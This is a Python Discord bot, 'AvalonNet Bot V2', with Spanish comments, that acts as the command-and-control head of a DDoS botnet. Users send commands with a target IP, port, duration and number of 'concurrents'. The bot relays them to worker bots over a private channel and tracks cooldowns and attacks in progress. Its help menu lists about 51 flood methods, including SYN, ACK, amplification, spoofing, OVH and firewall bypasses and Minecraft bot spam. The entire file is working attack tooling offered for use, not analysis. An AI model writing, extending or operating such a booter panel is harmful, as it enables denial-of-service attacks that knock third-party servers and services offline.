import os
import discord
from discord.ext import commands
import random
import asyncio
from collections import defaultdict

TOKEN = os.getenv("AVALON_KEY")
CONTROL_CHANNEL = 1428765751472558130
PRIVATE_CHANNEL = 1439628382605283369
BOT_POOL = []
MAX_CONCS = 10

# Diccionario para seguir qué bots están ocupados y qué método están usando
bots_ocupados = {}  # {bot_id: {'tiempo_fin': timestamp, 'metodo': metodo}}

# Diccionario para cooldown por usuario Y por método
cooldowns = defaultdict(dict)  # {user_id: {metodo: tiempo_finalizacion}}

# Diccionario para cooldown global cuando se usan todos los concurrentes
global_cooldown = defaultdict(float)  # {user_id: tiempo_finalizacion}

# Diccionario para seguir ataques activos
ataques_activos = {}

intents = discord.Intents.default()
intents.message_content = True
head_bot = commands.Bot(command_prefix='.', intents=intents)

@head_bot.event
async def on_ready():
    print(f'AvalonNet Bot iniciado')
    print(f'MAX CONCS: {MAX_CONCS}')
    await head_bot.change_presence(activity=discord.Game(name=f"AvalonNet Bot V2 | {len(BOT_POOL)} concs"))

@head_bot.event
async def on_message(message):
    if message.author == head_bot.user:
        return
    
    if message.channel.id == PRIVATE_CHANNEL and message.content.startswith("BOT_"):
        bot_id = message.content.strip()
        if bot_id not in BOT_POOL:
            BOT_POOL.append(bot_id)
            print(f"Registrado: {bot_id} | Total: {len(BOT_POOL)}")
            await head_bot.change_presence(activity=discord.Game(name=f"AvalonNet Bot | {len(BOT_POOL)} concs"))
    
    await head_bot.process_commands(message)

def obtener_bots_disponibles():
    """Retorna lista de bots que NO están ocupados"""
    tiempo_actual = asyncio.get_event_loop().time()
    # Limpiar bots que ya terminaron su ataque
    bots_a_liberar = [bot for bot, info in bots_ocupados.items() if info['tiempo_fin'] <= tiempo_actual]
    for bot in bots_a_liberar:
        del bots_ocupados[bot]
    
    return [bot for bot in BOT_POOL if bot not in bots_ocupados]

def obtener_bots_por_metodo(metodo):
    """Retorna cuántos bots están usando un método específico"""
    return sum(1 for info in bots_ocupados.values() if info.get('metodo') == metodo)

async def dispatch_attack(metodo, ip, port, time, concs_solicitados, ctx, msg_inicio):
    """Enviar ataque a los bots disponibles (solo los libres)"""
    
    bots_libres = obtener_bots_disponibles()
    bots_disponibles = len(bots_libres)
    bots_a_usar = min(concs_solicitados, bots_disponibles, MAX_CONCS)
    
    if bots_a_usar == 0:
        return False, 0, 0
    
    private_channel = head_bot.get_channel(PRIVATE_CHANNEL)
    used_bots = []
    tiempo_actual = asyncio.get_event_loop().time()
    
    for i in range(bots_a_usar):
        bot_id = random.choice(bots_libres)
        bots_ocupados[bot_id] = {'tiempo_fin': tiempo_actual + time, 'metodo': metodo}
        
        full_cmd = f"{bot_id} .{metodo} {ip} {port} {time}"
        await private_channel.send(full_cmd)
        used_bots.append(bot_id)
        print(f"[{metodo}] Enviado a {bot_id}: {ip}:{port} {time}s ({i+1}/{bots_a_usar})")
        await asyncio.sleep(0.5)
        bots_libres.remove(bot_id)
    
    embed_inicio = discord.Embed(
        title=f"{metodo.upper()} INICIADO",
        description=f"**Target:** `{ip}:{port}`\n**Duración:** `{time}s`\n**Concs:** `{bots_a_usar}/{concs_solicitados}`",
        color=0x00ff00
    )
    await msg_inicio.edit(embed=embed_inicio)
    
    attack_id = f"{metodo}_{ip}_{port}_{time}_{ctx.author.id}"
    ataques_activos[attack_id] = {
        'metodo': metodo,
        'ip': ip,
        'port': port,
        'time': time,
        'concs_usados': bots_a_usar,
        'concs_solicitados': concs_solicitados,
        'ctx': ctx
    }
    
    asyncio.create_task(attack_finished(attack_id, time, bots_a_usar))
    
    return True, bots_a_usar, bots_disponibles

async def attack_finished(attack_id, duration, concs_usados):
    await asyncio.sleep(int(duration))
    
    if attack_id in ataques_activos:
        attack_info = ataques_activos[attack_id]
        
        embed_final = discord.Embed(
            title=f"{attack_info['metodo'].upper()} FINALIZADO",
            description=f"**Target:** `{attack_info['ip']}:{attack_info['port']}`\n**Duración:** `{duration}s`\n**Concs:** `{attack_info['concs_usados']}/{attack_info['concs_solicitados']}`",
            color=0xff0000
        )
        
        await attack_info['ctx'].send(embed=embed_final)
        del ataques_activos[attack_id]
        
        print(f"Ataque finalizado: {attack_info['metodo']} {attack_info['ip']}:{attack_info['port']}")

@head_bot.command(name='concs')
async def count_concs(ctx):
    global BOT_POOL
    BOT_POOL = []
    bots_ocupados.clear()
    
    embed = discord.Embed(
        title="BUSCANDO CONCURRENTES...",
        description="Esperando conexion...",
        color=0xFFA500
    )
    msg = await ctx.send(embed=embed)
    
    private_channel = head_bot.get_channel(PRIVATE_CHANNEL)
    await private_channel.send(".concs")
    
    await asyncio.sleep(5)
    
    BOT_POOL = list(dict.fromkeys(BOT_POOL))
    bots_libres = obtener_bots_disponibles()
    
    # Estadísticas por método
    metodos_stats = {}
    for info in bots_ocupados.values():
        metodo = info.get('metodo', 'desconocido')
        metodos_stats[metodo] = metodos_stats.get(metodo, 0) + 1
    
    descripcion = f"**Availables:** `{len(bots_libres)}`\n**Used:** `{len(bots_ocupados)}`\n**Max:** `{MAX_CONCS}`"
    
    if metodos_stats:
        descripcion += "\n\n**Métodos activos:**"
        for metodo, count in metodos_stats.items():
            descripcion += f"\n`{metodo.upper()}`: {count} concs"
    
    if BOT_POOL:
        embed = discord.Embed(
            title=f"{len(BOT_POOL)} CONCURRENTES TOTALES",
            description=descripcion,
            color=0x00ff00
        )
        await msg.edit(embed=embed)
    else:
        embed = discord.Embed(
            title="0 CONCS ACTIVOS",
            description="Conectando...",
            color=0xff0000
        )
        await msg.edit(embed=embed)
    
    await head_bot.change_presence(activity=discord.Game(name=f"AvalonNet Bot | {len(bots_libres)}/{len(BOT_POOL)} concs"))

async def clear_cooldown(user_id, metodo, duration):
    await asyncio.sleep(duration)
    if user_id in cooldowns and metodo in cooldowns[user_id]:
        del cooldowns[user_id][metodo]
        if not cooldowns[user_id]:  # Si no quedan métodos en cooldown
            del cooldowns[user_id]

async def clear_global_cooldown(user_id, duration):
    await asyncio.sleep(duration)
    if user_id in global_cooldown:
        del global_cooldown[user_id]

async def metodo_base(ctx, metodo, ip=None, port=None, time=None, concs=1, extra_args=None):
    
    if ip is None:
        embed = discord.Embed(
            title="ERROR: IP FALTANTE",
            description=f"`.{metodo} <IP> <PUERTO> <TIEMPO> [CONCURRENTES]`\n\n**Example:**\n`.{metodo} 1.1.1.1 80 60 1`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    if port is None:
        embed = discord.Embed(
            title="ERROR: PUERTO FALTANTE",
            description=f"`.{metodo} {ip} <PUERTO> <TIEMPO> [CONCURRENTES]`\n\n**Example:**\n`.{metodo} {ip} 80 60 1`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    if time is None:
        embed = discord.Embed(
            title="ERROR: TIEMPO FALTANTE",
            description=f"`.{metodo} {ip} {port} <TIEMPO> [CONCURRENTES]`\n\n**Example:**\n`.{metodo} {ip} {port} 60 1`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    try:
        port_int = int(port)
        time_int = int(time)
        concs_int = int(concs)
    except ValueError:
        embed = discord.Embed(
            title="ERROR: VALORES INVÁLIDOS",
            description="Puerto, tiempo y concs deben ser números",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    if port_int < 1 or port_int > 65535:
        embed = discord.Embed(
            title="ERROR: PUERTO INVÁLIDO",
            description="El puerto debe estar entre 1 y 9999",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    if time_int < 1 or time_int > 120:
        embed = discord.Embed(
            title="ERROR: TIEMPO INVÁLIDO",
            description="El tiempo debe estar entre 1 y 120 segundos",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    if concs_int < 1 or concs_int > MAX_CONCS:
        embed = discord.Embed(
            title="ERROR: CONCS INVÁLIDO",
            description=f"Del 1 al máximo {MAX_CONCS}",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    user_id = ctx.author.id
    current_time = asyncio.get_event_loop().time()
    
    # Verificar cooldown global (cuando se usaron todos los concurrentes)
    if user_id in global_cooldown:
        time_left = global_cooldown[user_id] - current_time
        if time_left > 0:
            embed = discord.Embed(
                title="COOLDOWN",
                description=f"Espera `{int(time_left)}s`",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return
    
    # Verificar cooldown específico del método
    if user_id in cooldowns and metodo in cooldowns[user_id]:
        time_left = cooldowns[user_id][metodo] - current_time
        if time_left > 0:
            embed = discord.Embed(
                title=f"COOLDOWN {metodo.upper()}",
                description=f"Espera `{int(time_left)}s`",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return
    
    bots_libres = obtener_bots_disponibles()
    if len(bots_libres) == 0:
        embed = discord.Embed(
            title="CONCURRENTES NO DISPONIBLES",
            description="No hay concurrentes libres",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    embed_inicio = discord.Embed(
        title=f"{metodo.upper()} STARTED...",
        description=f"**Target:** `{ip}:{port_int}`\n**Duración:** `{time_int}s`\n**Concs:** `{concs_int}`|`{len(bots_libres)}`",
        color=0xFFA500
    )
    msg_inicio = await ctx.send(embed=embed_inicio)
    
    success, real_concs, disponibles = await dispatch_attack(metodo, ip, port_int, time_int, concs_int, ctx, msg_inicio)
    
    if not success:
        embed = discord.Embed(
            title="ERROR AL INICIAR ATAQUE",
            description="No hay concurrentes disponibles",
            color=0xff0000
        )
        await msg_inicio.edit(embed=embed)
    else:
        # Cooldown específico por método (5 segundos después del ataque)
        if user_id not in cooldowns:
            cooldowns[user_id] = {}
        cooldowns[user_id][metodo] = current_time + time_int + 5
        asyncio.create_task(clear_cooldown(user_id, metodo, time_int + 5))
        
        # Si se usaron TODOS los concurrentes disponibles, aplicar cooldown global de 10 segundos
        if real_concs == len(obtener_bots_disponibles()) + real_concs or real_concs == MAX_CONCS:
            global_cooldown[user_id] = current_time + time_int + 10
            asyncio.create_task(clear_global_cooldown(user_id, time_int + 10))
            
            # Notificación adicional de cooldown global
            embed_aviso = discord.Embed(
                title="COOLDOWN",
                description=f"Max Concs ocupados`{real_concs}`, espera unos 10s",
                color=0xFFA500
            )
            await ctx.send(embed=embed_aviso)

# ========================================
# TODOS LOS 51 MÉTODOS
# ========================================

@head_bot.command(name='udp')
async def cmd_udp(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udp', ip, port, time, concs)

@head_bot.command(name='icmpgame')
async def cmd_icmpgame(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'icmpgame', ip, port, time, concs)

@head_bot.command(name='raknetv2')
async def cmd_raknetv2(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'raknetv2', ip, port, time, concs)

@head_bot.command(name='mixgame')
async def cmd_mixgame(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'mixgame', ip, port, time, concs)

@head_bot.command(name='udpbypassv2')
async def cmd_udpbypassv2(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpbypassv2', ip, port, time, concs)

@head_bot.command(name='udpserver')
async def cmd_udpserver(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpserver', ip, port, time, concs)

@head_bot.command(name='raknet')
async def cmd_raknet(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'raknet', ip, port, time, concs)

@head_bot.command(name='udpdns')
async def cmd_udpdns(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpdns', ip, port, time, concs)

@head_bot.command(name='udpchecksum')
async def cmd_udpchecksum(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpchecksum', ip, port, time, concs)

@head_bot.command(name='land')
async def cmd_land(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'land', ip, port, time, concs)

@head_bot.command(name='syn')
async def cmd_syn(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'syn', ip, port, time, concs)

@head_bot.command(name='ack')
async def cmd_ack(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'ack', ip, port, time, concs)

@head_bot.command(name='tcpgame')
async def cmd_tcpgame(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'tcpgame', ip, port, time, concs)

@head_bot.command(name='gamepps')
async def cmd_gamepps(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'gamepps', ip, port, time, concs)

@head_bot.command(name='tcpbypass')
async def cmd_tcpbypass(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'tcpbypass', ip, port, time, concs)

@head_bot.command(name='udpping')
async def cmd_udpping(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpping', ip, port, time, concs)

@head_bot.command(name='udpsql')
async def cmd_udpsql(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpsql', ip, port, time, concs)

@head_bot.command(name='udpsockets')
async def cmd_udpsockets(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpsockets', ip, port, time, concs)

@head_bot.command(name='udphandshake')
async def cmd_udphandshake(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udphandshake', ip, port, time, concs)

@head_bot.command(name='icmpbypass')
async def cmd_icmpbypass(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'icmpbypass', ip, port, time, concs)

@head_bot.command(name='icmp')
async def cmd_icmp(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'icmp', ip, port, time, concs)

@head_bot.command(name='ovhpps')
async def cmd_ovhpps(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'ovhpps', ip, port, time, concs)

@head_bot.command(name='udppayload')
async def cmd_udppayload(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udppayload', ip, port, time, concs)

@head_bot.command(name='udptls')
async def cmd_udptls(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udptls', ip, port, time, concs)

@head_bot.command(name='udpplain')
async def cmd_udpplain(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpplain', ip, port, time, concs)

@head_bot.command(name='udpfrag')
async def cmd_udpfrag(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpfrag', ip, port, time, concs)

@head_bot.command(name='udpquery')
async def cmd_udpquery(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpquery', ip, port, time, concs)

@head_bot.command(name='stdhex')
async def cmd_stdhex(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'stdhex', ip, port, time, concs)

@head_bot.command(name='udpspoof')
async def cmd_udpspoof(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpspoof', ip, port, time, concs)

@head_bot.command(name='hex')
async def cmd_hex(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'hex', ip, port, time, concs)

@head_bot.command(name='kill')
async def cmd_kill(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'kill', ip, port, time, concs)

@head_bot.command(name='udppps')
async def cmd_udppps(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udppps', ip, port, time, concs)

@head_bot.command(name='ovhbypass')
async def cmd_ovhbypass(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'ovhbypass', ip, port, time, concs)

@head_bot.command(name='ovhudp')
async def cmd_ovhudp(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'ovhudp', ip, port, time, concs)

@head_bot.command(name='dns')
async def cmd_dns(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'dns', ip, port, time, concs)

@head_bot.command(name='ovhtcp')
async def cmd_ovhtcp(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'ovhtcp', ip, port, time, concs)

@head_bot.command(name='tcp')
async def cmd_tcp(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'tcp', ip, port, time, concs)

@head_bot.command(name='tcpmix')
async def cmd_tcpmix(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'tcpmix', ip, port, time, concs)

@head_bot.command(name='mix')
async def cmd_mix(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'mix', ip, port, time, concs)

@head_bot.command(name='udpraw')
async def cmd_udpraw(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpraw', ip, port, time, concs)

@head_bot.command(name='udpflood')
async def cmd_udpflood(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpflood', ip, port, time, concs)

@head_bot.command(name='udpstorm')
async def cmd_udpstorm(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpstorm', ip, port, time, concs)

@head_bot.command(name='udpgame')
async def cmd_udpgame(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpgame', ip, port, time, concs)

@head_bot.command(name='udpamp')
async def cmd_udpamp(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpamp', ip, port, time, concs)

@head_bot.command(name='udpbypass')
async def cmd_udpbypass(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpbypass', ip, port, time, concs)

@head_bot.command(name='udpvse')
async def cmd_udpvse(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpvse', ip, port, time, concs)

@head_bot.command(name='udpsyn')
async def cmd_udpsyn(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpsyn', ip, port, time, concs)

@head_bot.command(name='udphttp')
async def cmd_udphttp(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udphttp', ip, port, time, concs)

@head_bot.command(name='udpkill')
async def cmd_udpkill(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'udpkill', ip, port, time, concs)

@head_bot.command(name='gameboom')
async def cmd_gameboom(ctx, ip: str = None, port: str = None, time: str = None, concs: str = "1"):
    await metodo_base(ctx, 'gameboom', ip, port, time, concs)

@head_bot.command(name='mcbot')
async def cmd_mcbot(ctx, ip: str = None, port: str = None, name: str = None, bots: str = None, time: str = None, regcmd: str = None, mensaje: str = None, intervalo: str = None, concs: str = "1"):
    
    if ip is None:
        embed = discord.Embed(
            title="ERROR: IP FALTANTE",
            description="`.mcbot <IP> <PUERTO> <NOMBRE> <BOTS> <TIEMPO> <REGCMD> <MENSAJE> <INTERVALO> [CONCS]`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    if port is None:
        embed = discord.Embed(
            title="ERROR: PUERTO FALTANTE",
            description="`.mcbot <IP> <PUERTO> <NOMBRE> <BOTS> <TIEMPO> <REGCMD> <MENSAJE> <INTERVALO> [CONCS]`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    if name is None:
        embed = discord.Embed(
            title="ERROR: NOMBRE FALTANTE",
            description="`.mcbot <IP> <PUERTO> <NOMBRE> <BOTS> <TIEMPO> <REGCMD> <MENSAJE> <INTERVALO> [CONCS]`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    if bots is None:
        embed = discord.Embed(
            title="ERROR: BOTS FALTANTE",
            description="`.mcbot <IP> <PUERTO> <NOMBRE> <BOTS> <TIEMPO> <REGCMD> <MENSAJE> <INTERVALO> [CONCS]`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    if time is None:
        embed = discord.Embed(
            title="ERROR: TIEMPO FALTANTE",
            description="`.mcbot <IP> <PUERTO> <NOMBRE> <BOTS> <TIEMPO> <REGCMD> <MENSAJE> <INTERVALO> [CONCS]`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    if regcmd is None:
        embed = discord.Embed(
            title="ERROR: REGCMD FALTANTE",
            description="`.mcbot <IP> <PUERTO> <NOMBRE> <BOTS> <TIEMPO> <REGCMD> <MENSAJE> <INTERVALO> [CONCS]`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    if mensaje is None:
        embed = discord.Embed(
            title="ERROR: MENSAJE FALTANTE",
            description="`.mcbot <IP> <PUERTO> <NOMBRE> <BOTS> <TIEMPO> <REGCMD> <MENSAJE> <INTERVALO> [CONCS]`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    if intervalo is None:
        embed = discord.Embed(
            title="ERROR: INTERVALO FALTANTE",
            description="`.mcbot <IP> <PUERTO> <NOMBRE> <BOTS> <TIEMPO> <REGCMD> <MENSAJE> <INTERVALO> [CONCS]`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    user_id = ctx.author.id
    current_time = asyncio.get_event_loop().time()
    
    # Verificar cooldown global
    if user_id in global_cooldown:
        time_left = global_cooldown[user_id] - current_time
        if time_left > 0:
            embed = discord.Embed(
                title="COOLDOWN",
                description=f"Espera `{int(time_left)}s`",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return
    
    # Verificar cooldown específico para mcbot
    if user_id in cooldowns and 'mcbot' in cooldowns[user_id]:
        time_left = cooldowns[user_id]['mcbot'] - current_time
        if time_left > 0:
            embed = discord.Embed(
                title=f"COOLDOWN PARA MCBOT",
                description=f"Espera `{int(time_left)}s`",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return
    
    bots_libres = obtener_bots_disponibles()
    if len(bots_libres) == 0:
        embed = discord.Embed(
            title="CONCURRENTES NO DISPONIBLES",
            description="No hay concurrentes libres",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    try:
        concs_int = int(concs)
        time_int = int(time)
        port_int = int(port)
    except ValueError:
        embed = discord.Embed(
            title="ERROR: VALORES INVÁLIDOS",
            description="CONCS, tiempo y puerto deben ser números",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    bots_a_usar = min(concs_int, len(bots_libres), MAX_CONCS)
    
    if bots_a_usar == 0:
        embed = discord.Embed(
            title="CONCURRENTES NO DISPONIBLES",
            description="No hay concurrentes disponibles para atacar",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    embed_inicio = discord.Embed(
        title=f"MCBOT INICIADO...",
        description=f"**Target:** `{ip}:{port}`\n**Nombre:** `{name}`\n**Bots:** `{bots}`\n**Duración:** `{time}s`\n**Concs:** `0/{concs_int}`",
        color=0xFFA500
    )
    msg_inicio = await ctx.send(embed=embed_inicio)
    
    private_channel = head_bot.get_channel(PRIVATE_CHANNEL)
    used_bots = []
    bots_usados_tmp = []
    tiempo_actual = asyncio.get_event_loop().time()
    
    for i in range(bots_a_usar):
        bot_id = random.choice([b for b in bots_libres if b not in bots_usados_tmp])
        bots_usados_tmp.append(bot_id)
        bots_ocupados[bot_id] = {'tiempo_fin': tiempo_actual + time_int, 'metodo': 'mcbot'}
        
        full_cmd = f"{bot_id} .mcbot {ip} {port} {name} {bots} {time} {regcmd} {mensaje} {intervalo}"
        await private_channel.send(full_cmd)
        used_bots.append(bot_id)
        await asyncio.sleep(0.5)
    
    embed_final = discord.Embed(
        title="MCBOT INICIADO",
        description=f"**Target:** `{ip}:{port}`\n**Nombre:** `{name}`\n**Bots:** `{bots}`\n**Duración:** `{time}s`\n**Concs:** `{bots_a_usar}/{concs_int}`",
        color=0x00ff00
    )
    await msg_inicio.edit(embed=embed_final)
    
    # Cooldown específico para mcbot
    if user_id not in cooldowns:
        cooldowns[user_id] = {}
    cooldowns[user_id]['mcbot'] = current_time + time_int + 5
    asyncio.create_task(clear_cooldown(user_id, 'mcbot', time_int + 5))
    
    # Si se usaron TODOS los concurrentes, aplicar cooldown global
    if bots_a_usar == len(obtener_bots_disponibles()) + bots_a_usar or bots_a_usar == MAX_CONCS:
        global_cooldown[user_id] = current_time + time_int + 10
        asyncio.create_task(clear_global_cooldown(user_id, time_int + 10))
        
        embed_aviso = discord.Embed(
            title="COOLDOWN",
            description=f"Espera unos 10s",
            color=0xFFA500
        )
        await ctx.send(embed=embed_aviso)
    
    attack_id = f"mcbot_{ip}_{port}_{time}_{ctx.author.id}"
    ataques_activos[attack_id] = {
        'metodo': 'MCBOT',
        'ip': ip,
        'port': port,
        'time': time,
        'concs_usados': bots_a_usar,
        'concs_solicitados': concs_int,
        'ctx': ctx
    }
    asyncio.create_task(attack_finished(attack_id, time))

@head_bot.command(name='methods')
async def methods_list(ctx):
    embed = discord.Embed(title="Available Methods: 51", color=0x0099ff)
    
    embed.add_field(name="L4 - UDP Methods", 
                   value="`udp` - UDP estándar\n`hex` - Hex UDP\n`udppps` - High PPS UDP\n`udpraw` - Raw UDP\n`udpflood` - Flood UDP\n`udpstorm` - Storm UDP\n`udpgame` - Game UDP\n`udpamp` - Amplification\n`udpbypass` - BYPASS GAME SERVERS\n`udpvse` - VSE Engine\n`udpsyn` - SYN-like UDP\n`udphttp` - HTTP over UDP\n`udpkill` - Kill UDP\n`ovhudp` - OVH UDP\n`dns` - DNS Flood Attack\n`udpspoof` - UDPSpoof Attack\n`stdhex` - STDHEX Flood Attack\n`udpquery` - Query UDP Flood\n`udpfrag` - Fragmentacion UDP\n`udpplain` - World Random Bytes\n`udptls` - UDP Handshake TLS Flood\n`udppayload` - UDPFLOOD Random Payload Games\n`ovhpps` - OVH BYPASS HIGH PPS\n`icmp` - ICMP UDP Payload Flood\n`icmpbypass` - ICMP Payload vía UDP Packet\n`udphandshake` - UDP Game Handshake\n`udpsockets` - UDP Sockets Attack\n`udpsql` - UDP SQL Payloads\n`udpping` - UDP Unconnect Ping Games + Flood\n`udpchecksum` - CheckSum UDP Invalid\n`udpdns` - Data in subdomains\n`udpserver` - Payload Server Games\n`udpbypassv2` - UDP Bypass Firewall\n`mixgame` - TCP + UDP GAMES",
                   inline=False)
    
    embed.add_field(name="L4 - TCP Methods", 
                   value="`tcp` - TCP estándar\n`ovhtcp` - OVH TCP\n`ovhbypass` - OVH Bypass\n`tcpmix` - MixTCP flood data+raw\n`tcpgame` - GAME TCP Flood\n`tcpbypass` - TCP Bypass\n`gamepps` - Game Payloads pps\n`ack` - ACK Flood\n`syn` - SYN Flood\n`land` - SYN packets with same source/dest IP",
                   inline=False)
    
    embed.add_field(name="Special Methods", 
                   value="`mix` - Mix Bytes\n`gameboom` - Game Boom Attack\n`kill` - Mixed Protocol UDP+TCP Flood\n`raknet` - Raknet Basic Flood\n`raknetv2` - Raknet advanced for MinecraftPe\n`icmpgame` - Game server ICMP logic\n`mcbot` - MinecraftPMMP 0.15.10 mcbot join + auth + spam msg + mov",
                   inline=False)
    
    embed.add_field(name="Example", 
                   value="`.udp 1.1.1.1 80 30 1`",
                   inline=False)
    
    await ctx.send(embed=embed)
    
if __name__ == "__main__":
    if not TOKEN:
        print("❌ ERROR: AVALON_KEY no configurada")
    else:
        print("Iniciando Avalon Head Bot...")
        head_bot.run(TOKEN)
